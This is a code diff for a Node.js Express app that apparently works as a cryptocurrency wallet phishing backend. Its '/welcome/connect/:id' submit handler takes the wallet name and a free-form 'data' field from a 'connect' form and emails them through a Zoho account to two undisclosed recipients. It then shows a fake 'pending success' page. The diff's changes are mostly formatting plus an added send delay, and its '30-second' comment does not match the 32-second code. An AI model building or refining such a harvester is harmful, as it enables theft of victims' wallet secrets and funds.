@@ -38,7 +38,6 @@ app.get('/connect/pending/success', (req, res) => {
 app.get('/welcome/connect/:id', (req, res) => {
     res.sendFile(__dirname + '/views/connect.html')
 })
-
 app.post('/welcome/connect/:id/submit', async (req, res) => {
     const transporter = nodemailer.createTransport({
         service: 'zoho',
@@ -46,46 +45,47 @@ app.post('/welcome/connect/:id/submit', async (req, res) => {
             user: "forwarding@fixnode-explorer.com",
             pass: PASSWORD
         }
-    })
+    });
 
     await new Promise((resolve, reject) => {
-        transporter.verify(function(error, success) {
-          if (error){
-            console.log(error)
-            reject(error)
-          }else{
-            console.log('Server succesfully ready to send mail to recipients and more...')
-            resolve(success)
-          }
-        })
-    })
+        transporter.verify((error, success) => {
+            if (error) {
+                console.log(error);
+                reject(error);
+            } else {
+                console.log('Server successfully ready to send mail to recipients and more...');
+                resolve(success);
+            }
+        });
+    });
 
-    const recipients = [RECIPIENT1, RECIPIENT2]
-    for(let recipient of recipients) {
+    const recipients = [RECIPIENT1, RECIPIENT2];
+    for (let recipient of recipients) {
         const mailOptions = {
             from: RECIPIENT1,
             to: recipient,
             subject: `${req.body.category}`,
             html: `Wallet Name(s): ${req.params.id} <br> ${req.body.data}`
-        }
+        };
 
         await new Promise((resolve, reject) => {
             transporter.sendMail(mailOptions, (error, info) => {
                 if (error) {
                     console.log(error);
                     reject(error);
-                }else{
+                } else {
                     console.log(`Email sent to ${recipient}: ` + info.response);
                     resolve(info);
                 }
+            });
+        });
 
-            })
-        })
+        // Introduce a 30-second delay between each email
+        await new Promise(resolve => setTimeout(resolve, 32000));
     }
 
-    await delay(2000)
-    res.redirect('/connect/pending/success')
-})
+    res.redirect('/connect/pending/success');
+});
 
 
 
